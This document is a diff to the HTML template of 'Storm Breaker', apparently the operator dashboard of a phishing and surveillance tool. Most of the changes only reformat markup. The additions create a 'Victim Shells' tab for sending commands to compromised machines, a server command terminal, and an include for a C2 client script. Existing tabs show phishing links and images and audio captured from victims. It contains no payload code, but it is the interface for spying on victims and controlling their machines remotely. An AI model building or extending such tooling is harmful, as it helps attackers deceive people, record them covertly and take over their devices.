@@ -1,11 +1,14 @@
 <!DOCTYPE html>
 <html lang="en" class="dark">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Storm Breaker | Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
     <script>
@@ -34,59 +37,71 @@
             width: 8px;
             height: 8px;
         }
+
         ::-webkit-scrollbar-track {
-            background: #0f172a; 
+            background: #0f172a;
         }
+
         ::-webkit-scrollbar-thumb {
-            background: #334155; 
+            background: #334155;
             border-radius: 4px;
         }
+
         ::-webkit-scrollbar-thumb:hover {
-            background: #475569; 
+            background: #475569;
         }
-        
+
         .glass-panel {
             background: rgba(30, 41, 59, 0.7);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
-        
+
         .premium-shadow {
             box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05), 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
         }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-200 font-sans antialiased h-screen overflow-hidden flex" onload="check_new_version()">
+
+<body class="bg-slate-950 text-slate-200 font-sans antialiased h-screen overflow-hidden flex"
+    onload="check_new_version()">
 
     <!-- Sidebar -->
     <aside class="w-72 bg-slate-900 border-r border-slate-800 flex flex-col z-20 hidden md:flex">
         <div class="h-16 flex items-center px-6 border-b border-slate-800">
             <div class="flex items-center space-x-3">
-                <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
+                <div
+                    class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
                     <i class="fas fa-bolt text-white text-sm"></i>
                 </div>
-                <span class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-slate-400">Storm Breaker</span>
+                <span
+                    class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-slate-400">Storm
+                    Breaker</span>
             </div>
         </div>
 
         <nav class="flex-1 overflow-y-auto py-6 px-4 space-y-1">
-            <a href="#" class="nav-link active flex items-center space-x-3 px-4 py-3 rounded-xl bg-blue-600/10 text-blue-400 border border-blue-600/10 transition-all group">
+            <a href="#"
+                class="nav-link active flex items-center space-x-3 px-4 py-3 rounded-xl bg-blue-600/10 text-blue-400 border border-blue-600/10 transition-all group">
                 <i class="fas fa-grid-2 w-5 text-center group-hover:scale-110 transition-transform"></i>
                 <span class="font-medium">Dashboard</span>
             </a>
-            <a href="#" class="nav-link flex items-center space-x-3 px-4 py-3 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
+            <a href="#"
+                class="nav-link flex items-center space-x-3 px-4 py-3 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
                 <i class="fas fa-terminal w-5 text-center group-hover:scale-110 transition-transform"></i>
                 <span class="font-medium">Logs</span>
             </a>
-            <a href="#" class="nav-link flex items-center space-x-3 px-4 py-3 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
+            <a href="#"
+                class="nav-link flex items-center space-x-3 px-4 py-3 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
                 <i class="fas fa-cog w-5 text-center group-hover:scale-110 transition-transform"></i>
                 <span class="font-medium">Settings</span>
             </a>
         </nav>
 
         <div class="p-4 border-t border-slate-800">
-            <a href="{{ url_for('logout') }}" class="flex items-center space-x-3 px-4 py-3 rounded-xl text-red-400 hover:bg-red-500/10 hover:text-red-300 transition-all group">
+            <a href="{{ url_for('logout') }}"
+                class="flex items-center space-x-3 px-4 py-3 rounded-xl text-red-400 hover:bg-red-500/10 hover:text-red-300 transition-all group">
                 <i class="fas fa-sign-out-alt w-5 text-center group-hover:-translate-x-1 transition-transform"></i>
                 <span class="font-medium">Logout</span>
             </a>
@@ -96,23 +111,27 @@
     <!-- Main Content -->
     <main class="flex-1 flex flex-col h-screen overflow-hidden relative">
         <!-- Background Glow -->
-        <div class="absolute top-0 left-0 w-full h-96 bg-blue-600/5 rounded-full blur-3xl -translate-y-1/2 pointer-events-none"></div>
+        <div
+            class="absolute top-0 left-0 w-full h-96 bg-blue-600/5 rounded-full blur-3xl -translate-y-1/2 pointer-events-none">
+        </div>
 
         <!-- Top Bar -->
-        <header class="h-16 border-b border-slate-800 bg-slate-900/50 backdrop-blur-xl flex items-center justify-between px-6 z-10">
+        <header
+            class="h-16 border-b border-slate-800 bg-slate-900/50 backdrop-blur-xl flex items-center justify-between px-6 z-10">
             <div class="flex items-center md:hidden">
                 <button class="text-slate-400 hover:text-white p-2">
                     <i class="fas fa-bars text-xl"></i>
                 </button>
             </div>
-            
+
             <div class="flex items-center space-x-4 ml-auto">
                 <div class="flex items-center space-x-3 pl-4 border-l border-slate-800">
                     <div class="text-right hidden sm:block">
                         <div class="text-sm font-medium text-white">{{ username }}</div>
                         <div class="text-xs text-slate-500">Administrator</div>
                     </div>
-                    <div class="w-10 h-10 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-300 font-bold shadow-inner">
+                    <div
+                        class="w-10 h-10 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-300 font-bold shadow-inner">
                         {{ username[0]|upper }}
                     </div>
                 </div>
@@ -122,7 +141,7 @@
         <!-- Content Scroll Area -->
         <div class="flex-1 overflow-y-auto p-6 md:p-8 scroll-smooth">
             <div class="max-w-7xl mx-auto space-y-8">
-                
+
                 <!-- Stats Grid -->
                 <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                     <div class="glass-panel p-6 rounded-2xl premium-shadow relative overflow-hidden group">
@@ -162,28 +181,42 @@
                 <!-- Tabs Navigation -->
                 <div class="border-b border-slate-800">
                     <nav class="flex space-x-8" aria-label="Tabs">
-                        <button class="tab-btn active group inline-flex items-center py-4 px-1 border-b-2 border-blue-500 font-medium text-sm text-blue-400" data-tab="links">
+                        <button
+                            class="tab-btn active group inline-flex items-center py-4 px-1 border-b-2 border-blue-500 font-medium text-sm text-blue-400"
+                            data-tab="links">
                             <i class="fas fa-link mr-2 group-hover:text-blue-400"></i>
                             <span>Phishing Links</span>
                         </button>
-                        <button class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all" data-tab="images">
+                        <button
+                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            data-tab="images">
                             <i class="fas fa-images mr-2 group-hover:text-slate-200"></i>
                             <span>Images</span>
                         </button>
-                        <button class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all" data-tab="audio">
+                        <button
+                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            data-tab="audio">
                             <i class="fas fa-microphone mr-2 group-hover:text-slate-200"></i>
                             <span>Audio</span>
                         </button>
-                        <button class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all" data-tab="logs">
-                            <i class="fas fa-chart-line mr-2 group-hover:text-slate-200"></i>
-                            <span>Live Traffic</span>
+                        <button
+                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            data-tab="terminal">
+                            <i class="fas fa-terminal mr-2 group-hover:text-slate-200"></i>
+                            <span>Terminal</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            data-tab="c2">
+                            <i class="fas fa-network-wired mr-2 group-hover:text-slate-200"></i>
+                            <span>Victim Shells</span>
                         </button>
                     </nav>
                 </div>
 
                 <!-- Tab Contents -->
                 <div class="relative min-h-[400px]">
-                    
+
                     <!-- Phishing Links Tab -->
                     <div id="tab-links" class="tab-content active space-y-6 animate__animated animate__fadeIn">
                         <div class="flex items-center justify-between">
@@ -200,13 +233,16 @@
 
                     <!-- Images Tab -->
                     <div id="tab-images" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
-                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                        <div
+                            class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
                             <h2 class="text-xl font-bold text-white">Captured Images</h2>
                             <div class="flex space-x-3">
-                                <button id="btn-refresh-images" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
+                                <button id="btn-refresh-images"
+                                    class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
                                     <i class="fas fa-sync-alt"></i> <span>Refresh</span>
                                 </button>
-                                <button id="btn-clear-images" class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
+                                <button id="btn-clear-images"
+                                    class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
                                     <i class="fas fa-trash"></i> <span>Clear All</span>
                                 </button>
                             </div>
@@ -222,13 +258,16 @@
 
                     <!-- Audio Tab -->
                     <div id="tab-audio" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
-                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                        <div
+                            class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
                             <h2 class="text-xl font-bold text-white">Audio Recordings</h2>
                             <div class="flex space-x-3">
-                                <button id="btn-refresh-audio" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
+                                <button id="btn-refresh-audio"
+                                    class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
                                     <i class="fas fa-sync-alt"></i> <span>Refresh</span>
                                 </button>
-                                <button id="btn-clear-audio" class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
+                                <button id="btn-clear-audio"
+                                    class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
                                     <i class="fas fa-trash"></i> <span>Clear All</span>
                                 </button>
                             </div>
@@ -244,24 +283,96 @@
 
                     <!-- Logs Tab -->
                     <div id="tab-logs" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
-                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                        <div
+                            class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
                             <h2 class="text-xl font-bold text-white">Live Traffic</h2>
                             <div class="flex space-x-3">
-                                <button id="btn-listen" class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
+                                <button id="btn-listen"
+                                    class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
                                     <i class="fas fa-stop"></i> <span>Stop</span>
                                 </button>
-                                <button id="btn-download" class="px-4 py-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 rounded-lg text-sm font-medium transition-colors border border-emerald-500/20 flex items-center space-x-2">
+                                <button id="btn-download"
+                                    class="px-4 py-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 rounded-lg text-sm font-medium transition-colors border border-emerald-500/20 flex items-center space-x-2">
                                     <i class="fas fa-download"></i> <span>Save</span>
                                 </button>
-                                <button id="btn-clear" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-400 rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
+                                <button id="btn-clear"
+                                    class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-400 rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
                                     <i class="fas fa-trash"></i> <span>Clear</span>
                                 </button>
                             </div>
                         </div>
-                        <div class="bg-black rounded-xl border border-slate-800 p-4 h-[500px] overflow-y-auto font-mono text-sm shadow-inner custom-scrollbar" id="log-terminal">
+                        <div class="bg-black rounded-xl border border-slate-800 p-4 h-[500px] overflow-y-auto font-mono text-sm shadow-inner custom-scrollbar"
+                            id="log-terminal">
                             <div class="flex space-x-2 mb-2">
                                 <span class="text-slate-500">[System]</span>
                                 <span class="text-emerald-400">Waiting for interactions...</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- System Terminal Tab -->
+                    <div id="tab-terminal" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div
+                            class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                            <h2 class="text-xl font-bold text-white">System Terminal</h2>
+                            <div class="text-sm text-slate-400">Execute commands on the server</div>
+                        </div>
+                        <div class="bg-black rounded-xl border border-slate-800 p-4 h-[500px] flex flex-col font-mono text-sm shadow-inner custom-scrollbar relative"
+                            onclick="document.getElementById('sys-cmd-input').focus()">
+                            <div id="sys-terminal-output" class="flex-1 overflow-y-auto mb-2 space-y-1 pb-4">
+                                <div class="text-slate-500">Welcome to Storm-Breaker System Terminal.</div>
+                                <div class="text-slate-500">Type your commands below.</div>
+                            </div>
+                            <div class="flex items-center border-t border-slate-800 pt-3">
+                                <span id="sys-prompt" class="text-emerald-500 mr-2 font-bold">admin@server:~$</span>
+                                <input type="text" id="sys-cmd-input"
+                                    class="flex-1 bg-transparent border-none outline-none text-slate-200 placeholder-slate-700 focus:ring-0"
+                                    placeholder="Type command..." autocomplete="off">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Victim C2 Tab -->
+                    <div id="tab-c2" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div
+                            class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                            <h2 class="text-xl font-bold text-white">Active Victim Sessions</h2>
+                            <button id="btn-refresh-c2"
+                                class="px-3 py-1 bg-slate-800 text-slate-400 rounded hover:bg-slate-700 text-sm">
+                                <i class="fas fa-sync-alt"></i> Refresh
+                            </button>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6 h-[500px]">
+                            <!-- Client List -->
+                            <div
+                                class="lg:col-span-1 bg-slate-900 rounded-xl border border-slate-800 flex flex-col overflow-hidden">
+                                <div class="p-3 border-b border-slate-800 text-xs font-bold text-slate-500 uppercase">
+                                    Clients</div>
+                                <div id="c2-client-list" class="flex-1 overflow-y-auto p-2 space-y-2">
+                                    <div class="text-center text-slate-600 py-4 italic">No active sessions</div>
+                                </div>
+                            </div>
+
+                            <!-- Console -->
+                            <div
+                                class="lg:col-span-3 bg-black rounded-xl border border-slate-800 flex flex-col font-mono text-sm shadow-inner relative text-slate-300">
+                                <div id="c2-terminal-header"
+                                    class="p-2 border-b border-slate-800 bg-slate-900/50 text-xs text-slate-500 flex justify-between">
+                                    <span>No client selected</span>
+                                    <span class="text-emerald-500 hidden" id="c2-status-indicator">●
+                                        Online</span>
+                                </div>
+                                <div id="c2-terminal-output" class="flex-1 overflow-y-auto p-4 space-y-1 mb-2">
+                                    <div class="text-slate-600">Select a client to start interaction...</div>
+                                </div>
+                                <div class="p-2 border-t border-slate-800 flex items-center bg-slate-900/30">
+                                    <span class="text-blue-500 mr-2 font-bold max-w-[100px] truncate"
+                                        id="c2-prompt">Make ></span>
+                                    <input type="text" id="c2-cmd-input"
+                                        class="flex-1 bg-transparent border-none outline-none text-slate-200 placeholder-slate-700 focus:ring-0"
+                                        placeholder="Enter command..." disabled>
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -275,5 +386,7 @@
     <script src="{{ url_for('static', filename='js/sweetalert2.min.js') }}"></script>
     <script src="{{ url_for('static', filename='js/growl-notification.min.js') }}"></script>
     <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/c2_client.js') }}"></script>
 </body>
+
 </html>
